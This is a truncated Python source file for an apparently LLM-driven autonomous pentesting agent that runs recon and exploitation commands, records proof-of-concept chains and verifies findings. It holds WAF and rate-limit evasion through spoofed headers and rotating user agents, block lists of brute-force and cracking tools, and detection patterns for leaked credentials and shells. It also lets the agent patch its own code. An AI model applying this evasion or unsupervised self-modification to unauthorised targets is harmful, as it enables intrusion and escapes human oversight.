import hashlib
import ipaddress
import json
import os
import re
import shlex
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any, Set
from dataclasses import dataclass, field, asdict
from collections import Counter

from constants import C, ICO, PROVIDERS, PROVIDER_PRIORITY, TOOL_FAMILIES, _TOOL_TO_FAMILY, SERVICE_ATTACKS, SCOPE_TOOL_SUGGESTIONS
from storage import DataManager, SQLDatabase, Session, StateDatabase, FailureMemory, JsonFileStore, LoopSignal
from memory import ChromaMemory, PGVectorMemory, BackgroundLearner, _memory_disabled, is_actionable_technique, technique_metadata, is_bug_bounty_mode, is_ctf_mode, is_fast_mode
from network import TrafficEntry, TrafficCollector, ProxyManager
from providers import AIBackend, OpenAICompatBackend, AnthropicBackend, GoogleBackend, OllamaBackend, FailoverRouter, make_ai, _failover_disabled, _provider_has_key, jwt_auto_scan, endpoints_from_collector, ai_max_tokens, ai_request_timeout
from attacks import InteractsClient, get_oob, oob_inject, AuthzDifferentialTester, JWTAttacker, CloudProber, CveMapper, GraphQLAttacker, _ver_lt, _ver_in_range, _cvss_from_severity
from tools import ToolResult, BrowserAutomation, BrowserCrawler, ToolExecutor, TaskManager
from execution import CommandGateway, GatewayExecutorAdapter, PolicyEngine, policy_from_config
from mcp_client import MCPClient, MCPResult
from plugin_manager import PluginManager
from reporting import ReportWriter, Finding, TargetModel, ThreatIntel, OTX, prioritize_findings, build_report, crtsh_subdomains, nessus_scan, remediation_for
from mission import GoalNode, GoalTree, ConfidenceScorer, LoopDetector, AutonomyProfile, MissionTask, VerificationVerdict, TaskGraph, Verifier, AutoReplanner, MissionManager
from loop import HypothesisState, StructuredHypothesis, GateResult, ValidationResult, AntiLoopState, AntiLoopEngine, get_antiloop, HYP_STATE_NEW, HYP_STATE_TESTING, HYP_STATE_CONFIRMED, HYP_STATE_REJECTED, HYP_STATE_DEAD, HYP_STATE_STALE, HYP_SCORE_REDUCE_THRESHOLD, HYP_DEAD_THRESHOLD
from self_improve import SelfAwareness, PerformanceAnalyzer, CodeSurgeon, CodePatch, PatchResult, ImprovementSuggestion, Bottleneck, mid_session_self_improve
from context_compressor import ContextCompressor, CompressionConfig
from tool_distributions import get_tools_for_phase, sample_tools_from_distribution
from telegram import TelegramBot
from utils import live_type, fingerprint_output, signature_command, classify_progress, validate_target, _parse_ints, decision_system_prompt, _ver_lt, _ver_in_range
from config import CONFIG, CONFIG_DIR, CONFIG_FILE, load_config, save_config, set_data, SCRIPTS_DIR, PAYLOADS_DIR, WORDLISTS_DIR
from logging_utils import log, swallow as _swallow, get_swallow_failures as _get_swallowed_failures
# lazy import: _extract_longcat_commands used inside _parse_decision
from tools import TOOLS
from tool_scanner import scan_available_tools, scan_missing_critical, build_tool_context
from brain.planner import Planner
import brain.planner as planning

class X19:
    def __init__(self, target: str = "", ai: Optional[AIBackend] = None):
        self.ai = ai or make_ai()
        self.mcp = MCPClient()
        self._legacy_exec = ToolExecutor(CONFIG.WORKSPACE, mcp_client=self.mcp)
        self.command_gateway = CommandGateway(self._legacy_exec)
        self.exec = GatewayExecutorAdapter(self._legacy_exec, self.command_gateway)
        self.session = Session()
        self.target = target
        self.targets: List[str] = []
        self.model = TargetModel(hostname=target)
        self._output_counter: int = 0
        self._counter_lock = threading.Lock()
        self.running = False
        self.stop = False
        self.target_type = CONFIG.TARGET_TYPE
        self.memory = ChromaMemory()
        self.memory.start_async_init()
        self.learner = BackgroundLearner(self.memory)
        self.proxy = ProxyManager()
        self._proxy_active = False
        self._session_lessons: list = []
        # Anti-loop tracking
        self._cmd_hashes: set = set()
        self._cmd_hashes_stripped: set = set()
        self._stuck_warnings: list = []
        self._service_iters: dict = {}
        self._last_service_category: str = "init"
        self._auth_attack_blocked: int = 0
        self._file_read_streak: int = 0
        self._conn_fail_streak: int = 0
        self._plan_sigs: dict = {}
        self._last_commands: list = []
        # Context compression
        self.context_compressor = ContextCompressor()
        # Dynamic tool scanning
        self._available_tools = {}
        self._missing_tools = {}
        self._tools_scanned = False
        # Attack planner
        self.planner = Planner()
        self.task_manager = TaskManager(self.exec, max_workers=8)
        # PoC tracking
        self.poc_chain: List[Dict] = []
        self._poc_mode: bool = False
        self._poc_finding_title: str = ""
        self._exploitation_success: bool = False
        self._last_reflection: str = ""
        # Plugins
        self.plugins = PluginManager(agent=self)
        # Plan tracking
        self._current_plan: Optional[dict] = None
        self._plan_step_index: int = 0
        self._plan_results: list = []
        # Recon loop hard enforcement
        self._output_hashes: list = []
        self._category_hard_limits: dict = {}
        self._banned_categories: set = set()
        self._recon_no_progress_count: int = 0
        self._recon_total: int = 0
        self._forced_exploit: bool = False
        # No-progress tracking for soft-lockout auto-unban
        self._no_progress_streak: int = 0
        self._last_unban_iter: int = -1
        self._iter_start_size: int = 0
        # Normalized command hash -> count, for catching same-script repeats
        self._normalized_cmd_counts: dict = {}
        # URLs that returned 404/410 in this session — used to detect repeated
        # hallucinated claims like "/evil/shell.jsp is deployed" when the URL is
        # actually 404.
        self._false_claim_urls: set = set()
        self._exploit_depth: int = 0                    # how many exploitation steps taken on current finding
        self._current_focus_finding: Optional[str] = None  # title of finding we're deepening
        self._depth_minimum: int = 3                    # minimum exploitation steps before allowing recon resumption
        self._found_high_this_session: bool = False     # flag sticky across resets: found high value
        # Recon prioritization / probe registry (also reset per-target in _reset_for_target)
        self._probed: dict = {}
        self._body_paths: dict = {}
        self._walls: set = set()
        # Response fingerprinting (SHA256 body hashes)
        self._fp_records: dict = {}        # url -> {sha256,length,content_type,status} (latest probe)
        self._fp_counts: dict = {}         # (url,sha256) -> times this exact response repeated
        self._fp_baseline: dict = {}       # url -> first-seen sha256 (unauth baseline for auth compare)
        self._seen_hashes: set = set()     # every sha256 seen (cross-endpoint duplicate detection)
        self._exhausted_endpoints: set = set()  # urls with >=5 identical responses
        self._branch_runs: dict = {}
        self._dead_branches: set = set()
        self._tool_effect: dict = {}     # tool -> {runs,wins} effectiveness scoring
        self._tool_zero_gain_streak: Dict[str, int] = {}  # tool -> consecutive zero-gain count
        # Blocked plan signature cache — stops same rejected plan from repeating
        self._blocked_plan_signatures: set = set()
        # Hypothesis lifecycle (NEW → TESTING → CONFIRMED/REJECTED/STALE)
        self._hypotheses: dict = {}
        self._banned_plan_categories: set = set()  # categories banned after plan-loop detection
        # Seen memory IDs — avoids spamming same records every iteration
        self._seen_memory_ids: set = set()
        # Recon saturation tracking
        self._exhausted_fingerprints: set = set()  # body hashes seen on 5+ endpoints (exhausted patterns)
        self._exhausted_techniques: set = set()    # categories with 10+ exhausted endpoints
        self._exhausted_by_cat: dict = {}          # category -> set(exhausted urls)
        self._probe_log: list = []                 # recent body hashes (duplicate-ratio window)
        self._cloudflare: bool = False             # WAF challenge detected (any vendor)
        self._cf_count: int = 0                    # WAF_BLOCKED responses seen
        self._waf_vendor: str = ""                 # CLOUDFLARE / AKAMAI / IMPERVA / CLOUDFRONT / SUCURI / F5 / WAF
        self._ai_empty_streak: int = 0             # consec empty/parse-fail AI responses (resets on success)
        self._last_override_cmd: str = ""          # last banned-category override command (for dedup)
        self._last_override_idx: int = -1          # rotation cursor for override candidates
        self._constraints: list = []               # planner memory: hard constraints from conclusions
        self._vector_codes: dict = {}              # (kind,key) -> {http_code: attempts}
        self._terminated_vectors: set = set()      # vectors abandoned after same code >2x
        # State persistence components
        self.state_db = StateDatabase(CONFIG_DIR)
        self.goal_tree = GoalTree()
        self.failure_memory = FailureMemory(CONFIG_DIR)
        self.loop_detector = LoopDetector()
        self.autonomy_profile = AutonomyProfile()
        self.mission_graph = TaskGraph(CONFIG_DIR)
        self.verifier = Verifier()
        self.auto_replanner = AutoReplanner()
        self.mission_manager = MissionManager(self)
        self.confidence_scorer = ConfidenceScorer()
        # Research log: hypothesis/result/lesson per iteration
        self._research_log: list = []
        # Tool failure tracker: tool_name -> {error: count}
        self._tool_failure_counts: dict = {}
        self._broken_tools: set = set()
        # Session memory: structured outcomes for cross-session learning
        self._session_outcomes: list = []
        # Hypothesis engine cache
        self._generated_hypotheses: list = []
        # Session instructions — user-provided rules that persist for the entire engagement
        self._session_instructions: str = ""
        # Self-upgrade components
        self.self_awareness = SelfAwareness()
        self.perf_analyzer = PerformanceAnalyzer()
        self.code_surgeon = CodeSurgeon()
        self._pending_improvements: List[ImprovementSuggestion] = []
        self._improvement_log: List[Dict] = []
        self._self_modify_enabled: bool = True
        # Tool name → package name mapping for auto-install on missing tools
        self.COMMON_TOOLS: Dict[str, str] = {
            "nmap": "nmap", "masscan": "masscan", "curl": "curl", "wget": "wget",
            "dig": "dnsutils", "nslookup": "dnsutils", "whois": "whois",
            "gobuster": "gobuster", "ffuf": "ffuf", "dirsearch": "dirsearch",
            "nuclei": "nuclei", "whatweb": "whatweb", "wpscan": "wpscan",
            "subfinder": "subfinder", "amass": "amass", "httpx": "httpx",
            "smbclient": "smbclient", "enum4linux": "enum4linux",
            "sqlmap": "sqlmap", "searchsploit": "exploitdb",
            "hydra": "hydra", "john": "john", "hashcat": "hashcat",
            "testssl": "testssl.sh", "sslscan": "sslscan",
            "dnsrecon": "dnsrecon", "sublist3r": "sublist3r",
            "katana": "katana", "gau": "gau", "waybackurls": "waybackurls",
        }
        self._loop_sig = LoopSignal()
        self._primary_web_port: Optional[int] = None
        self._consecutive_blocked_plans = 0
        self._consecutive_blocked_cmds = 0
        # Rate-limit / WAF bypass state
        self._rate_limit_detected: bool = False
        self._rate_limit_backoff: float = 1.0  # current delay multiplier
        self._rate_limit_streak: int = 0
        self._user_agent_index: int = 0
        self._user_agents: List[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        ]
        self._waf_bypass_headers: List[Dict[str, str]] = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"},
        ]
        self._current_waf_bypass_idx: int = -1
        self._current_ua: str = self._user_agents[0]
        # Phase enforcement state
        self._current_phase: str = "recon"
        self._phase_iterations: int = 0        # iterations stuck in current phase
        self._phase_attempts: dict = {}         # phase -> {tool: count}
        self._phase_stuck: bool = False
        self._phase_blocked_count: int = 0     # consecutive blocked commands in stuck phase
        self._asked_human_hint: bool = False

    # Auth attack patterns — blocked when target_type is "public_real_world"
    # Phase-based enforcement
    PHASES = ["recon", "enum", "vuln", "exploit", "report"]
    # Minimum data needed to advance from each phase
    _PHASE_ADVANCE_RULES = {
        "recon":  lambda m: len(m.ports) >= 1 and any(p.get("service") for p in m.ports),
        "enum":   lambda m: len(m.endpoints) >= 2 or len(m.findings) >= 1,
        "vuln":   lambda m: any(f.severity in ("critical", "high", "medium") for f in m.findings),
        "exploit": lambda m: any(f.severity == "critical" for f in m.findings) or getattr(m, "_exploitation_success", False),
        "report": lambda m: True,
    }
    # Tools allowed per phase (empty = all tools allowed)
    _PHASE_TOOLS = {
        "recon":   {"nmap", "masscan", "ping", "curl", "wget", "dig", "nslookup", "whois", "openssl"},
        "enum":    {"curl", "gobuster", "ffuf", "dirsearch", "whatweb", "wget", "nmap", "smbclient", "enum4linux", "dnsrecon", "nuclei", "searchsploit"},
        "vuln":    {"nuclei", "searchsploit", "curl", "nmap", "whatweb", "testssl", "sqlmap", "wpscan"},
        "exploit": {"curl", "nc", "ncat", "python3", "perl", "ruby", "php", "searchsploit", "msfconsole"},
        "report":  set(),
    }

    AUTH_ATTACK_PATTERNS = [
        re.compile(r, re.I) for r in [
            r'hydra\s', r'medusa\s', r'ncrack\s', r'crowbar\s', r'patator\s',
            r'bruteforce|brute\.force|bruteforce',
            r'password.?spray|password.?spraying',
            r'credential.?stuff',
            r'login.*bypass|auth.*bypass|bypass.*auth',
            r'changepasswd|forcechagepassword|reset.*password.*other',
            r'spray.*password',
            r'john\s.*hash|hashcat\s',
            r'crack.*password|crack.*hash',
            r'password.*attack|attack.*password',
            r'--password.*--username|--user.*--pass\b',
            r'net\s+user\s+\S+\s+\S+\s*/\s*add',
            r'wpd\.on?line|wpa.*crack',
            r'sqlmap.*--forms|sqlmap.*--crawl',
            r'offline.*password',
        ]
    ]

    # ===================== PoC Recording =====================
    EXPLOIT_SUCCESS_PATTERNS = [
        re.compile(r, re.I) for r in [
            # Shell / system compromise (must be REAL shell, not 500 error pages)
            r'uid=\d+([\w]+)\s+gid=', r'root:x?:0:0:',
            r'^bash: no job control', r'^#\s+whoami',
            r'^\$\s+whoami', r'Microsoft Windows \[version',
            r'NT AUTHORITY\\SYSTEM',
            r'^\d+ entries? found', r'SEARCH RESULTS',
            r'credentials found', r'password found',
            r'administrator:\d+:\d+:',
            r'flag\{[^}]+\}', r'CTF\{[^}]+\}',
            r'Got NTLM', r'\[*\] Dumping',
            r'\[\+\] Saved', r'\[\+\] Dumped',
            r'\[\+\] Found', r'\[\+\] Got',
            # Web exploitation indicators (concrete, not generic)
            r'sql syntax error|mysql_fetch|pg_query|ora-\d{5}|unclosed quote',
            r'warning:\s*mysqli|fatal error\s*.*\s*sql',
            r'<script>alert\(.*?\)</script>| XSS |cross.site.script',
            r'root:.*:0:.*:/root:/bin/bash',
            r'\.env\s+file|APP_KEY=',
            r'admin\s+panel|dashboard\s+login\s+successful',
            r'aws_access_key_id|AKIA[0-9A-Z]{16}',
            r'private-key|ssh-rsa AAAA',
            r'\.git/config|\.svn/entries|\.hg/store',
            r'phpinfo\(\)',
            r'laravel\.log|symfony\.log',
            r'reflected.*input|eval\(|system\(|exec\(',
        ]
    ]

    @property
    def world_model(self):
        from brain.world_model import WorldModel
        return WorldModel.from_legacy(self.model)

    # ===================== Proxy Control =====================

    def toggle_proxy(self) -> str:
        if self._proxy_active:
            self.proxy.stop()
            self._proxy_active = False
            return "proxy stopped"
        ok = self.proxy.start()
        if ok:
            self._proxy_active = True
            return f"proxy started ({self.proxy.proxy_url()})"
        return "proxy start failed (check burp/mitm availability)"

    # ===================== PoC Recording =====================

    def record_poc_step(self, step: str, command: str, output: str, category: str = "recon"):
        """Record one step of an exploitation chain for PoC generation."""
        entry = {
            "step": len(self.poc_chain) + 1,
            "category": category,
            "action": step,
            "command": command[:300],
            "output_snippet": output[:500],
            "timestamp": datetime.now().isoformat(),
        }
        self.poc_chain.append(entry)
        print(f"{C.G}[PoC #{entry['step']}] {step}{C.N}")

    def check_exploit_success(self, output: str) -> Optional[str]:
        """Check if command output indicates exploitation succeeded."""
        for pat in self.EXPLOIT_SUCCESS_PATTERNS:
            m = pat.search(output)
            if m:
                return m.group(0)[:80]
        return None

    def enter_poc_mode(self, title: str):
        """Enter focused exploitation mode for a specific finding."""
        if self._poc_mode:
            return
        self._poc_mode = True
        self._poc_finding_title = title
        # Reset command dedup to allow focused exploitation commands
        self._cmd_hashes.clear()
        self._cmd_hashes_stripped.clear()
        self._service_iters.clear()
        print(f"{C.BOLD}{C.G}[POC] Entering PoC mode — focused on: {title}{C.N}")
        self.record_poc_step(f"Focusing on: {title}", "", "", "poc_start")

    def generate_poc_report(self) -> str:
        """Generate a complete PoC report from the chain."""
        if not self.poc_chain:
            return "No PoC steps recorded."

        lines = [
            "=" * 72,
            "X19 — PROOF OF CONCEPT REPORT",
            "=" * 72,
            f"Target:      {self.target}",
            f"Target Type: {self.target_type}",
            f"Date:        {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Finding:     {self._poc_finding_title or 'N/A'}",
            f"Total Steps: {len(self.poc_chain)}",
            "=" * 72,
            "",
        ]
        for entry in self.poc_chain:
            lines.append(f"--- Step {entry['step']}: {entry['action']} ---")
            if entry["command"]:
                lines.append(f"Command:")
                lines.append(f"  {entry['command']}")
            if entry["output_snippet"]:
                lines.append(f"Output:")
                for out_line in entry["output_snippet"].split("\n"):
                    lines.append(f"  {out_line}")
            lines.append("")
        lines.append("=" * 72)
        lines.append("END OF PROOF OF CONCEPT")
        lines.append("=" * 72)
        return "\n".join(lines)

    def save_poc_report(self) -> Optional[str]:
        """Save PoC report to file and return path."""
        report = self.generate_poc_report()
        if not report or report.startswith("No PoC"):
            return None
        safe_target = re.sub(r'[^\w\-\.]', '_', self.target)[:40]
        path = Path(CONFIG.SESSIONS_DIR) / f"poc_{safe_target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(report)
        return str(path)

    # ===================== PLAN EXECUTION =====================

    def _execute_plan_step(self, idx: int, step: dict) -> dict:
        """Run one plan step; returns result dict."""
        if not isinstance(step, dict):
            return {"step": idx, "status": "skipped", "action": "invalid"}
        action = step.get("action", "run")
        step_label = step.get("label", f"Step {idx+1}")

        if action == "run":
            cmd = step.get("command", "")
            if not cmd:
                return {"step": idx, "status": "skipped", "action": "run"}
            result = self._execute_and_store(cmd, step.get("timeout", 120))
            self._record_tool_family(cmd)
            print(f"{C.B}[Plan] {step_label}: exit={result.returncode}{C.N}")
            return {"step": idx, "status": "done", "result": result, "action": "run", "command": cmd}

        if action == "write_script":
            path = step.get("path", f"{CONFIG.TMP_DIR}/x19_script_{idx}.py")
            content = step.get("content", "")
            try:
                Path(path).write_text(content)
                os.chmod(path, 0o755)
                print(f"{C.G}[Plan] Wrote script: {path}{C.N}")
                return {"step": idx, "status": "done", "path": path, "action": "write_script"}
            except Exception as e:
                print(f"{C.R}[Plan] Write failed: {e}{C.N}")
                return {"step": idx, "status": "error", "error": str(e)}

        if action == "analyze":
            at = step.get("target", "")
            prompt = step.get("prompt", f"Analyze what we know about {at} and suggest next steps")
            ctx = self._build_analysis_context(at)
            analysis = self.ai.chat(
                "You are a senior pentester analyzing findings. Be concise and specific.",
                ctx + "\n\n" + prompt,
            )
            self.model.notes.append(f"Analysis: {analysis[:500]}")
            print(f"{C.B}[Plan] Analysis: {analysis[:200]}{C.N}")
            return {"step": idx, "status": "done", "analysis": analysis, "action": "analyze"}

        if action == "update_model":
            updates = step.get("updates", {})
            for key, value in updates.items():
                if key == "os":
                    self.model.os_info = str(value)
                elif key == "tech" and isinstance(value, dict):
                    self.model.tech_stack.update(value)
            return {"step": idx, "status": "done", "action": "update_model"}

        if action == "note":
            text = step.get("text", "")
            if text:
                self.model.notes.append(text)
            return {"step": idx, "status": "done", "action": "note"}

        if action == "self_modify":
            patch_data = step.get("patch", {})
            if not patch_data or not self._self_modify_enabled:
                return {"step": idx, "status": "skipped", "action": "self_modify"}
            patch = CodePatch(
                id=f"patch_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{idx}",
                description=patch_data.get("description", ""),
                target_function=patch_data.get("target_function", ""),
                patch_type=patch_data.get("patch_type", "modify"),
                original_code=patch_data.get("original_code", ""),
                new_code=patch_data.get("new_code", ""),
                validation_hint=patch_data.get("validation_hint", ""),
                expected_impact=patch_data.get("expected_impact", ""),
                risk=patch_data.get("risk", "low"),
            )
            print(f"{C.M}[Self-Modify] {patch.description[:200]}{C.N}")
            result = self.code_surgeon.apply_patch(patch)
            if result.success:
                print(f"{C.G}[+] Patch applied: {result.diff[:200]}{C.N}")
                if result.needs_restart:
                    print(f"{C.Y}[!] Restart needed for patch to take full effect{C.N}")
                self._improvement_log.append({
                    "patch_id": patch.id,
                    "description": patch.description,
                    "diff": result.diff,
                    "timestamp": datetime.now().isoformat(),
                    "validated": result.validated,
                })
            else:
                print(f"{C.R}[!] Patch failed: {result.error}{C.N}")
            return {
                "step": idx,
                "status": "done" if result.success else "failed",
                "result": result,
                "action": "self_modify",
            }

        if action == "register_tool":
            tool_name = step.get("tool_name", "")
            tool_cmd = step.get("command", "")
            tool_desc = step.get("description", "")
            if tool_name and tool_cmd:
                code_line = DataManager.register_tool(tool_name, tool_cmd, tool_desc, step.get("timeout", 120))
                pkg = step.get("package", "")
                if pkg:
                    self.COMMON_TOOLS[tool_name] = pkg
                print(f"{C.G}[+] Tool registered: {tool_name}{C.N}")
                return {"step": idx, "status": "done", "tool": tool_name, "code_line": code_line, "action": "register_tool"}
            return {"step": idx, "status": "skipped", "action": "register_tool"}

        return {"step": idx, "status": "skipped", "action": action}

    def execute_plan(self, plan: dict) -> List[dict]:
        """Execute a multi-step plan. Each step: {action, command|script|analyze, ...}
        Returns list of step results."""
        steps = [s for s in plan.get("steps", []) if isinstance(s, dict)]
        results = []
        use_parallel = CONFIG.PARALLEL_PLAN or is_bug_bounty_mode()
        idx = 0
        while idx < len(steps):
            if self.stop:
                results.append({"step": idx, "status": "interrupted"})
                break

            step = steps[idx]
            action = step.get("action", "run")

            # Parallel batch: consecutive run steps
            if use_parallel and action == "run":
                batch_idx = []
                batch_cmds: List[Tuple[int, str, int]] = []
                while idx < len(steps) and steps[idx].get("action") == "run":
                    cmd = steps[idx].get("command", "")
                    if cmd:
                        batch_idx.append(idx)
                        batch_cmds.append((idx, cmd, steps[idx].get("timeout", 120)))
                    idx += 1
                if len(batch_cmds) > 1:
                    # Recon guards BEFORE running so the parallel path can't loop on exhausted/blocked probes.
                    runnable = []
                    for (b_i, cmd, t) in batch_cmds:
                        reason = self._recon_blocked(cmd) or (
                            "failure-backoff" if self.failure_memory.is_blocked(cmd)[0] else None)
                        if reason:
                            print(f"{C.Y}[!] SKIP (saturation) {cmd[:60]} — {reason}{C.N}")
                            self.session.add_cmd(cmd, f"[BLOCKED: {reason}]", "blocked", -1)
                            results.append({"step": b_i, "status": "blocked", "action": "run"})
                        else:
                            runnable.append((b_i, cmd, t))
                    if not runnable:
                        continue
                    print(f"{C.M}[Plan] Running {len(runnable)} commands in parallel{C.N}")
                    _psize = self._model_size()
                    par = self._run_commands_parallel([(c, t) for _, c, t in runnable])
                    for (b_i, cmd, _), (_, result) in zip(runnable, par):
                        self._extract_to_model(cmd, result)
                        self._register_probe(cmd, result)
                        self._track_cloudflare(result)
                        self._track_vector(cmd, result)
                        self._record_tool_family(cmd)
                        cat = self._cmd_category(cmd)
                        if not result.ok:
                            self.failure_memory.record_failure(cmd, cat, result.stderr or result.stdout or "")
                        self.session.add_cmd(cmd, result.text[:500], cat, result.returncode)
                        results.append({"step": b_i, "status": "done", "result": result, "action": "run"})
                    self._record_tool_effect([c for _, c, _ in runnable], self._model_size() > _psize)
                    continue
                if batch_cmds:
                    idx = batch_idx[0]
                    step = steps[idx]
                    idx += 1
                    results.append(self._execute_plan_step(idx - 1, step))
                    continue
                continue

            results.append(self._execute_plan_step(idx, step))
            idx += 1

        self._plan_results.extend(results)
        return results

    def _detect_rate_limit(self, result: "ToolResult") -> bool:
        """Detect rate limiting / WAF blocking from command output.
        Returns True if rate limiting is detected."""
        blob = ((result.stdout or "") + " " + (result.stderr or "")).lower()
        rate_signals = [
            "429", "rate limit", "rate_limit", "too many requests",
            "try again later", "retry after", "retry-after",
            "503 service unavailable", "service temporarily unavailable",
            "please slow down", "slow down",
            "blocked", "access denied", "403 forbidden",
            "waf", "cloudflare", "challenge", "cdn",
        ]
        hit = any(s in blob for s in rate_signals)
        if hit:
            self._rate_limit_streak += 1
            self._rate_limit_detected = True
            self._rate_limit_backoff = min(30.0, self._rate_limit_backoff * 1.5)
            # Rotate user-agent on each detection
            self._current_ua = self._user_agents[self._user_agent_index % len(self._user_agents)]
            self._user_agent_index += 1
            if self._rate_limit_streak >= 3:
                # Try WAF bypass headers
                self._current_waf_bypass_idx = (self._current_waf_bypass_idx + 1) % len(self._waf_bypass_headers)
            print(f"{C.Y}[!] RATE LIMIT detected (streak={self._rate_limit_streak}, "
                  f"backoff={self._rate_limit_backoff:.1f}s, UA#{self._user_agent_index}){C.N}")
        else:
            if self._rate_limit_streak > 0:
                self._rate_limit_streak -= 1
            if self._rate_limit_streak <= 0:
                self._rate_limit_detected = False
                self._rate_limit_backoff = 1.0
        return hit

    def _execute_and_store(self, command: str, timeout: int = 120) -> "ToolResult":
        """Execute a command with rate-limit awareness, user-agent rotation, and WAF bypass.

        Retries transient rate-limit/network failures with exponential backoff + jitter.
        Auto-rotates user-agent and WAF bypass headers when rate limiting is detected."""
        import random
        # Apply rate-limit backoff delay before execution
        if self._rate_limit_detected:
            delay = self._rate_limit_backoff * random.uniform(0.5, 1.5)
            print(f"{C.Y}[!] Rate-limit backoff: sleeping {delay:.1f}s{C.N}")
            time.sleep(delay)
        # Auto-inject OOB canary into nuclei / sqlmap invocations
        try:
            command = oob_inject(command)
        except Exception as e:
            _swallow(e)
        # Prepend curl with rate-limit aware flags if it's a curl command
        if command.strip().startswith("curl "):
            ua = self._current_ua
            if self._current_waf_bypass_idx >= 0:
                bh = self._waf_bypass_headers[self._current_waf_bypass_idx]
                header_str = " ".join(f"-H '{k}: {v}'" for k, v in bh.items())
                command = command.replace("curl ", f"curl {header_str} ", 1)
            command = command.replace("curl ", f"curl --user-agent '{ua}' ", 1)
        with self._counter_lock:
            cmd_id = f"cmd_{self._output_counter}"
            self._output_counter += 1
        for attempt in range(3):
            result = self.exec.run(command, timeout=timeout)
            # Rate-limit detection
            rl_hit = self._detect_rate_limit(result)
            err = f"{result.stderr or ''} {result.error or ''}".lower()
            transient = result.returncode != 0 and any(k in err for k in (
                "rate limit", "429", "throttle", "timeout", "timed out",
                "connection refused", "temporary failure", "could not resolve", "dns",
            ))
            if not transient or attempt == 2:
                break
            delay = (2 ** attempt + random.uniform(0, 1)) * self._rate_limit_backoff
            print(f"{C.Y}[*] Transient error — retry {attempt + 1}/2 in {delay:.1f}s{C.N}")
            time.sleep(delay)
        self.model.store_output(cmd_id, command, result.stdout or "", result.stderr or "", result.returncode)
        return result

    def _build_analysis_context(self, target: str = "") -> str:
        """Build a detailed analysis context from the target model for LLM analysis."""
        parts = [f"=== TARGET MODEL for {self.model.hostname} ==="]
        if self.model.ip_addresses:
            parts.append(f"IPs: {', '.join(self.model.ip_addresses[:5])}")
        if self.model.os_info:
            parts.append(f"OS: {self.model.os_info[:200]}")
        if self.model.subdomains:
            parts.append(f"\nSubdomains ({len(self.model.subdomains)}):")
            for s in sorted(self.model.subdomains)[:20]:
                parts.append(f"  {s}")
            if len(self.model.subdomains) > 20:
                parts.append(f"  ... and {len(self.model.subdomains) - 20} more")
        if self.model.ports:
            parts.append(f"\nPorts/Services:")
            for p in self.model.ports[:25]:
                ver = f" {p['version']}" if p.get('version') else ""
                parts.append(f"  {p['key']:10} {p['service']}{ver}")
        if self.model.tech_stack:
            parts.append(f"\nTech Stack:")
            for k, v in self.model.tech_stack.items():
                parts.append(f"  {k}: {v}" if v else f"  {k}")
        if self.model.endpoints:
            parts.append(f"\nEndpoints ({len(self.model.endpoints)}):")
            for e in self.model.endpoints[-15:]:
                parts.append(f"  {e.get('method','?'):6} {e.get('url','')[:120]} [{e.get('status','?')}]")
        if self.model.credentials:
            parts.append(f"\nCredentials ({len(self.model.credentials)}):")
            for c in self.model.credentials:
                parts.append(f"  {c.get('service','?')}: {c.get('username','?')}:{c.get('password','?')}")
        if self.model.findings:
            parts.append(f"\nFindings:")
            for f in self.model.findings[-10:]:
                sev = f.severity if isinstance(f, Finding) else f.get("severity", "info")
                title = f.title if isinstance(f, Finding) else f.get("title", "")
                parts.append(f"  [{sev.upper()}] {title}")
        if self.model.attack_paths:
            parts.append(f"\nAttack Paths:")
            for a in self.model.attack_paths:
                status = "[x] attempted" if a.get("attempted") else "[ ] pending"
                parts.append(f"  {status} {a.get('service','?')}: {a.get('technique','?')} — {a.get('rationale','')[:100]}")
        if self.model.notes:
            parts.append(f"\nNotes:")
            for n in self.model.notes[-5:]:
                parts.append(f"  {n[:200]}")
        return "\n".join(parts)

    def _llm_verify_finding(self, finding: dict, command: str, output: str) -> Optional[Dict]:
        """Use LLM to verify a finding with actual evidence from command output.
        Falls back to _validate_finding (4-gate engine) if LLM is unavailable."""
        if not finding or not finding.get("title"):
            return None
        if not output:
            print(f"{C.Y}[!] Finding '{finding.get('title','?')}' rejected — no command output to verify against{C.N}")
            return None

        val = self._validate_finding(finding, command, output)
        if not val.is_confirmed:
            print(f"{C.Y}[!] Finding '{finding.get('title','?')}' rejected by validation "
                  f"({val.classification}): {val.explanation[:120]}{C.N}")
            return None

        prompt = f"""You are a strict finding verifier. Given a claimed finding and the actual command output, determine if the finding is REAL or FALSE.

CLAIMED FINDING:
Title: {finding.get('title', '')}
Severity: {finding.get('severity', 'info')}
Detail: {finding.get('detail', '')}
Claimed Evidence: {finding.get('evidence', '')}

COMMAND EXECUTED:
{command[:500]}

ACTUAL OUTPUT:
{output[:2000]}

Analyze the output carefully. Return JSON ONLY:
{{
  "verified": true/false,
  "actual_severity": "critical"/"high"/"medium"/"low"/"info",
  "evidence_snippet": "exact text from output that proves or disproves this",
  "explanation": "one sentence why this is real or false"
}}"""
        try:
            resp = self.ai.chat("You verify pentest findings. Be strict. No false positives.", prompt)
            if not resp:
                return finding
            m = re.search(r'\{.*"verified".*\}', resp, re.DOTALL)
            if m:
                result = json.loads(m.group(0))
                if result.get("verified"):
                    snippet = result.get("evidence_snippet", "")
                    if not snippet or len(snippet) < 20:
                        print(f"{C.Y}[!] Finding '{finding.get('title','?')}' — LLM evidence snippet too short ({len(snippet)} chars){C.N}")
